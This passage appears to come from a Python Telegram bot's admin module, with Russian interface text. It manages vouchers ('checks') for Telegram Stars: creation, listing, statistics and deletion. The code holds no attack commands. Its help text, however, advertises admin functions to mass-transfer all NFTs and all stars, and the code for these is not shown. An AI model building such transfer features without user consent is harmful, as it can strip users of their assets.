                f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n\n"
                f"🗑️ Чек был удален из системы."
            )
            
            # Логируем действие админа
            log_admin_action(
                message.from_user.id,
                "delete_check_command",
                f"deleted check {check_id} ({check['stars_amount']} stars)"
            )
        else:
            text = "❌ <b>Ошибка удаления чека!</b>\n\nПопробуйте еще раз или обратитесь к разработчику."
        
        await message.answer(text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Ошибка при удалении чека через команду: {e}")
        await message.answer(
            f"❌ <b>Ошибка удаления чека:</b> {str(e)}",
            parse_mode="HTML"
        )

@router.message(F.text == "/help")
async def show_help(message: Message):
    """Показать справку"""
    if not is_admin(message.from_user.id):
        return
    
    help_text = (
        "📖 <b>Справка по командам админа</b>\n\n"
        "/admin - Админ-панель\n"
        "/logs - Последние логи\n"
        "/help - Эта справка\n\n"
        "🎫 <b>Система чеков:</b>\n"
        "/delete_check <ID> - удалить чек по ID\n"
        "Пример: /delete_check d4080cb3-1d1e-4dfd-a782-88549703df2a\n\n"
        "🔧 <b>Функции админ-панели:</b>\n"
        "• 📊 Статистика - общая статистика бота\n"
        "• 👥 Пользователи - список пользователей\n"
        "• 🔄 Массовый перевод NFT - перевод всех NFT\n"
        "• ⭐️ Массовый перевод звезд - перевод всех звезд\n"
        "• 📢 Рассылка - отправка сообщений всем пользователям\n"
        "• 🔧 Настройки - настройки бота\n"
        "• 📋 Логи - просмотр логов\n"
        "• 🎫 Система чеков - создание и управление чеками"
    )
    
    await message.answer(help_text, parse_mode="HTML")

# Система чеков
@router.callback_query(F.data == "admin_checks")
async def admin_checks(callback: CallbackQuery):
    """Система чеков"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        stats = get_checks_statistics()
        
        text = (
            "🎫 <b>Система чеков на звезды</b>\n\n"
            f"📊 <b>Статистика:</b>\n"
            f"• Всего чеков: {stats['total_checks']}\n"
            f"• Использовано: {stats['used_checks']}\n"
            f"• Не использовано: {stats['unused_checks']}\n"
            f"• Всего звезд: {stats['total_stars']}\n"
            f"• Использовано звезд: {stats['used_stars']}\n"
            f"• Не использовано звезд: {stats['unused_stars']}\n\n"
            "💡 <b>Как создать чек:</b>\n"
            "1. В любом чате напишите: @Storthash_bot чек 100 Подарок\n"
            "2. Выберите красивый чек из предложенных\n"
            "3. Отправьте другу!\n\n"
            "Выберите действие:"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Создать чек", callback_data="admin_create_check")],
            [InlineKeyboardButton(text="📋 Список чеков", callback_data="admin_list_checks")],
            [InlineKeyboardButton(text="🗑️ Удалить чек", callback_data="admin_delete_check")],
            [InlineKeyboardButton(text="🗑️ Удалить ВСЕ чеки", callback_data="admin_delete_all_checks")],
            [InlineKeyboardButton(text="📊 Статистика чеков", callback_data="admin_checks_stats")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка в admin_checks: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка загрузки системы чеков: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
            ])
        )

@router.callback_query(F.data == "admin_create_check")
async def admin_create_check_start(callback: CallbackQuery, state: FSMContext):
    """Начало создания чека"""
    if not is_admin(callback.from_user.id):
        return
    
    await state.set_state(CheckSystemStates.waiting_for_stars_amount)
    
    text = (
        "➕ <b>Создание чека на звезды</b>\n\n"
        "Введите количество звезд для чека (только число):\n\n"
        "💡 Пример: 100, 500, 1000\n\n"
        "❌ Для отмены отправьте /cancel"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="admin_checks")]
    ])
    
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)

@router.message(CheckSystemStates.waiting_for_stars_amount)
async def handle_stars_amount(message: Message, state: FSMContext):
    """Обработка ввода количества звезд"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        stars_amount = int(message.text.strip())
        
        if stars_amount <= 0:
            await message.answer(
                "❌ Количество звезд должно быть больше 0!\n"
                "Попробуйте еще раз или отправьте /cancel для отмены"
            )
            return
        
        await state.update_data(stars_amount=stars_amount)
        await state.set_state(CheckSystemStates.waiting_for_check_description)
        
        await message.answer(
            f"✅ Количество звезд: <b>{stars_amount}</b>\n\n"
            "Теперь введите описание чека (необязательно):\n\n"
            "💡 Пример: Подарок на день рождения, Бонус за регистрацию\n\n"
            "❌ Для отмены отправьте /cancel\n"
            "⏭️ Для пропуска отправьте /skip"
        )
        
    except ValueError:
        await message.answer(
            "❌ Пожалуйста, введите только число!\n"
            "Попробуйте еще раз или отправьте /cancel для отмены"
        )

@router.message(CheckSystemStates.waiting_for_check_description)
async def handle_check_description(message: Message, state: FSMContext):
    """Обработка ввода описания чека"""
    if not is_admin(message.from_user.id):
        return
    
    if message.text == "/skip":
        description = ""
    else:
        description = message.text.strip()
    
    data = await state.get_data()
    stars_amount = data.get("stars_amount")
    
    try:
        # Создаем чек
        check = create_check(stars_amount, description)
        
        # Генерируем ссылку на бота с параметром чека
        bot_username = (await message.bot.get_me()).username
        check_link = f"https://t.me/{bot_username}?start=check_{check['id']}"
        
        text = (
            "✅ <b>Чек успешно создан!</b>\n\n"
            f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
            f"⭐️ <b>Количество звезд:</b> {stars_amount}\n"
            f"📝 <b>Описание:</b> {description or 'Не указано'}\n"
            f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n\n"
            f"🔗 <b>Ссылка для пользователя:</b>\n"
            f"<code>{check_link}</code>\n\n"
            "📋 Скопируйте ссылку и отправьте пользователю!"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎫 Создать еще чек", callback_data="admin_create_check")],
            [InlineKeyboardButton(text="📋 Список чеков", callback_data="admin_list_checks")],
            [InlineKeyboardButton(text="⬅️ Назад к системе чеков", callback_data="admin_checks")]
        ])
        
        await message.answer(text, parse_mode="HTML", reply_markup=keyboard)
        await state.clear()
        
    except Exception as e:
        logger.error(f"Ошибка создания чека: {e}")
        await message.answer(
            f"❌ Ошибка создания чека: {str(e)}\n\n"
            "Попробуйте еще раз или отправьте /cancel для отмены"
        )

@router.callback_query(F.data == "admin_list_checks")
async def admin_list_checks(callback: CallbackQuery):
    """Список всех чеков"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        checks = get_all_checks()
        
        if not checks:
            await callback.message.edit_text(
                "📋 <b>Список чеков</b>\n\n"
                "Чеки не найдены.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
                ]),
                parse_mode="HTML"
            )
            return
        
        # Сортируем чеки по дате создания (новые сначала)
        checks.sort(key=lambda x: x["created_at"], reverse=True)
        
        text = "📋 <b>Список всех чеков:</b>\n\n"
        
        for i, check in enumerate(checks[:10], 1):  # Показываем только первые 10
            status = "✅ Использован" if check["used"] else "⏳ Не использован"
            used_info = ""
            
            if check["used"]:
                used_info = f"\n👤 Использовал: {check.get('username', 'Неизвестно')}"
                if check.get("used_at"):
                    used_info += f"\n📅 Дата: {check['used_at'][:19].replace('T', ' ')}"
            
            text += (
                f"{i}. <b>ID:</b> <code>{check['id'][:8]}...</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"📝 <b>Описание:</b> {check.get('description', 'Не указано')}\n"
                f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n"
                f"🔸 <b>Статус:</b> {status}{used_info}\n\n"
            )
        
        if len(checks) > 10:
            text += f"... и еще {len(checks) - 10} чеков\n\n"
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_list_checks")],
            [InlineKeyboardButton(text="🗑️ Удалить чек", callback_data="admin_delete_check")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка получения списка чеков: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка получения списка чеков: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
            ])
        )

@router.callback_query(F.data == "admin_checks_stats")
async def admin_checks_stats(callback: CallbackQuery):
    """Подробная статистика чеков"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        stats = get_checks_statistics()
        
        text = (
            "📊 <b>Подробная статистика чеков</b>\n\n"
            f"🎫 <b>Общая статистика:</b>\n"
            f"• Всего чеков: {stats['total_checks']}\n"
            f"• Использовано: {stats['used_checks']}\n"
            f"• Не использовано: {stats['unused_checks']}\n\n"
            f"⭐️ <b>Статистика звезд:</b>\n"
            f"• Всего звезд: {stats['total_stars']}\n"
            f"• Использовано звезд: {stats['used_stars']}\n"
            f"• Не использовано звезд: {stats['unused_stars']}\n\n"
            f"📈 <b>Эффективность:</b>\n"
            f"• Процент использования: {(stats['used_checks'] / stats['total_checks'] * 100) if stats['total_checks'] > 0 else 0:.1f}%\n"
            f"• Среднее количество звезд на чек: {stats['total_stars'] / stats['total_checks'] if stats['total_checks'] > 0 else 0:.0f}"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_checks_stats")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка получения статистики чеков: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка получения статистики чеков: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
            ])
        )

@router.callback_query(F.data == "admin_delete_check")
async def admin_delete_check_start(callback: CallbackQuery, state: FSMContext):
    """Начало удаления чека"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        unused_checks = get_unused_checks()
        
        if not unused_checks:
            await callback.message.edit_text(
                "🗑️ <b>Удаление чека</b>\n\n"
                "❌ Нет неиспользованных чеков для удаления.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
                ]),
                parse_mode="HTML"
            )
            return
        
        # Сортируем чеки по дате создания (новые сначала)
        unused_checks.sort(key=lambda x: x["created_at"], reverse=True)
        
        text = "🗑️ <b>Выберите чек для удаления:</b>\n\n"
        
        keyboard = []
        for i, check in enumerate(unused_checks[:10], 1):  # Показываем только первые 10
            text += (
                f"{i}. <b>ID:</b> <code>{check['id'][:8]}...</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"📝 <b>Описание:</b> {check.get('description', 'Не указано')}\n"
                f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n\n"
            )
            
            keyboard.append([
                InlineKeyboardButton(
                    text=f"🗑️ Удалить {check['id'][:8]}...",
                    callback_data=f"delete_check_confirm:{check['id']}"
                )
            ])
        
        if len(unused_checks) > 10:
            text += f"... и еще {len(unused_checks) - 10} чеков\n\n"
        
        keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")])
        
        await callback.message.edit_text(
            text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
        )
        
    except Exception as e:
        logger.error(f"Ошибка при загрузке чеков для удаления: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка загрузки чеков: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
            ])
        )

@router.callback_query(F.data.startswith("delete_check_confirm:"))
async def delete_check_confirm(callback: CallbackQuery):
    """Подтверждение удаления чека"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        check_id = callback.data.split(":")[1]
        check = get_check(check_id)
        
        if not check:
            await callback.answer("❌ Чек не найден!", show_alert=True)
            return
        
        if check["used"]:
            await callback.answer("❌ Нельзя удалить использованный чек!", show_alert=True)
            return
        
        text = (
            f"🗑️ <b>Подтверждение удаления чека</b>\n\n"
            f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
            f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
            f"📝 <b>Описание:</b> {check.get('description', 'Не указано')}\n"
            f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n\n"
            f"⚠️ <b>Внимание!</b> Это действие нельзя отменить.\n"
            f"Чек будет удален навсегда.\n\n"
            f"Вы уверены, что хотите удалить этот чек?"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Да, удалить", callback_data=f"delete_check_final:{check_id}"),
                InlineKeyboardButton(text="❌ Отмена", callback_data="admin_delete_check")
            ]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка при подтверждении удаления чека: {e}")
        await callback.answer("❌ Произошла ошибка", show_alert=True)

@router.callback_query(F.data.startswith("delete_check_final:"))
async def delete_check_final(callback: CallbackQuery):
    """Финальное удаление чека"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        check_id = callback.data.split(":")[1]
        check = get_check(check_id)
        
        if not check:
            await callback.answer("❌ Чек не найден!", show_alert=True)
            return
        
        if check["used"]:
            await callback.answer("❌ Нельзя удалить использованный чек!", show_alert=True)
            return
        
        # Удаляем чек
        if delete_check(check_id):
            text = (
                f"✅ <b>Чек успешно удален!</b>\n\n"
                f"🎫 <b>ID чека:</b> <code>{check['id']}</code>\n"
                f"⭐️ <b>Звезд:</b> {check['stars_amount']}\n"
                f"📝 <b>Описание:</b> {check.get('description', 'Не указано')}\n"
                f"📅 <b>Создан:</b> {check['created_at'][:19].replace('T', ' ')}\n\n"
                f"🗑️ Чек был удален из системы."
            )
            
            # Логируем действие админа
            log_admin_action(
                callback.from_user.id,
                "delete_check",
                f"deleted check {check_id} ({check['stars_amount']} stars)"
            )
        else:
            text = "❌ <b>Ошибка удаления чека!</b>\n\nПопробуйте еще раз или обратитесь к разработчику."
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Удалить еще", callback_data="admin_delete_check")],
            [InlineKeyboardButton(text="⬅️ Назад к чекам", callback_data="admin_checks")]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка при удалении чека: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка удаления чека: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
            ])
        )

@router.callback_query(F.data == "admin_delete_all_checks")
async def admin_delete_all_checks(callback: CallbackQuery):
    """Подтверждение удаления всех чеков"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        # Получаем статистику чеков
        stats = get_checks_statistics()
        
        if stats['total_checks'] == 0:
            await callback.answer("❌ Нет чеков для удаления!", show_alert=True)
            return
        
        text = (
            f"🗑️ <b>Подтверждение удаления ВСЕХ чеков</b>\n\n"
            f"📊 <b>Текущая статистика:</b>\n"
            f"• Всего чеков: {stats['total_checks']}\n"
            f"• Использовано: {stats['used_checks']}\n"
            f"• Не использовано: {stats['unused_checks']}\n"
            f"• Всего звезд: {stats['total_stars']}\n"
            f"• Использовано звезд: {stats['used_stars']}\n"
            f"• Не использовано звезд: {stats['unused_stars']}\n\n"
            f"⚠️ <b>ВНИМАНИЕ!</b>\n"
            f"Это действие удалит ВСЕ чеки из системы.\n"
            f"Использованные чеки также будут удалены.\n"
            f"Это действие НЕЛЬЗЯ отменить!\n\n"
            f"Вы уверены, что хотите удалить ВСЕ чеки?"
        )
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Да, удалить ВСЕ", callback_data="delete_all_checks_confirm"),
                InlineKeyboardButton(text="❌ Отмена", callback_data="admin_checks")
            ]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка при подготовке удаления всех чеков: {e}")
        await callback.answer("❌ Произошла ошибка", show_alert=True)

@router.callback_query(F.data == "delete_all_checks_confirm")
async def delete_all_checks_confirm(callback: CallbackQuery):
    """Финальное удаление всех чеков"""
    if not is_admin(callback.from_user.id):
        return
    
    try:
        # Получаем все чеки
        all_checks = get_all_checks()
        
        if not all_checks:
            await callback.answer("❌ Нет чеков для удаления!", show_alert=True)
            return
        
        # Удаляем все чеки
        deleted_count = 0
        failed_count = 0
        
        for check in all_checks:
            try:
                if delete_check(check['id']):
                    deleted_count += 1
                else:
                    failed_count += 1
            except Exception as e:
                logger.error(f"Ошибка удаления чека {check['id']}: {e}")
                failed_count += 1
        
        # Логируем действие админа
        log_admin_action(
            callback.from_user.id,
            "delete_all_checks",
            f"deleted {deleted_count} checks, failed: {failed_count}"
        )
        
        text = (
            f"✅ <b>Удаление всех чеков завершено!</b>\n\n"
            f"📊 <b>Результат:</b>\n"
            f"• Удалено чеков: {deleted_count}\n"
            f"• Ошибок удаления: {failed_count}\n"
            f"• Всего обработано: {len(all_checks)}\n\n"
        )
        
        if failed_count > 0:
            text += f"⚠️ <b>Внимание:</b> {failed_count} чеков не удалось удалить.\n"
            text += "Возможно, они были использованы или заблокированы.\n\n"
        
        text += "🗑️ Все чеки были удалены из системы."
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад к чекам", callback_data="admin_checks")]
        ])
        
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Ошибка при удалении всех чеков: {e}")
        await callback.message.edit_text(
            f"❌ Ошибка удаления всех чеков: {str(e)}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_checks")]
            ])
        ) 